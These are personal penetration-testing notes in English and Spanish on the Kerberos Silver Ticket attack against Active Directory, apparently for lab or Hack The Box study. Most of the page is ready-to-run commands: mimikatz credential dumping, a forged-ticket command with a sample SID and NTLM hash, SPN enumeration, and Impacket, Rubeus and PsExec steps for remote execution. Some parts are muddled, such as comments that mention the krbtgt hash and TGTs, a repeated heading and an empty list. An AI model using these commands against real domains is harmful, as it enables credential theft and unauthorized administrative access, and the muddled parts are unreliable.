

## DESCRIPTION

The Silver ticket attack is based on crafting a valid TGS for a service once the NTLM hash of service is owned (like the PC account hash). Thus, it is possible to gain access to that service by forging a custom TGS as any user.
In this case, the NTLM hash of a computer account (which is kind of a user account in AD) is owned. Hence, it is possible to craft a ticket in order to get into that machine with administrator privileges through the SMB service. The computer accounts reset their passwords every 30 days by default.


What's we need? →  service KEY
What's we obtain? → TGS


El Silver Ticket es similar al GoldenTickets, pero esta vez se construye un TGS y lo que se requiere es la clave del servicio al que se quiere acceder. Esta clave se deriva del hash NTLM de la cuenta propietaria del servicio. Esta técnica no funcionará si el servicio verifica el PAC, ya que al no conocer la clave de krbtgt, no es posible firmarlo correctamente.

Realmente necesitamos:

#### Mas información
* https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket
* https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets


## EXPLOITATION

### OPTION 1: MIMIKATZ

1. Ejecutamos mimikatz

```
privilege::debug
sekurlsa::logonpasswords
```

![[Pasted image 20230525205916.png]]

2. Necesitaremo el SID del dominio que lo podemos sacar a partir del SID del usuario

![[Pasted image 20230525210059.png]]

3. Necesitamos un usuario para el que se falsificara el ticket

```
mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
```

![[Pasted image 20230525210220.png]]

Para ver los tickets cargados en la memoria se puede utilizar

![[Pasted image 20230525210308.png]]

En este ejemplo podemos acceder a una web:

![[Pasted image 20230525212514.png]]

**!!NOTA IMPORTANTE!!** 
Enumerar SPN

```
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```

### OPTION 2: IMPACKET

```
With Impacket examples:

# To generate the TGT with NTLM
python ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <domain_name>  <user_name>

# To generate the TGT with AES key
python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name>  <user_name>

# Set the ticket for impacket use
export KRB5CCNAME=<TGS_ccache_file>

# Execute remote commands with any of the following by using the TGT
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass

```

### OPTION 1: MIMIKATZ

```
Inject ticket with Rubeus:

.\Rubeus.exe ptt /ticket:<ticket_kirbi_file>
Execute a cmd in the remote machine with PsExec:

.\PsExec.exe -accepteula \\<remote_hostname> cmd
```



## MACHINES

* Hack The Box: 

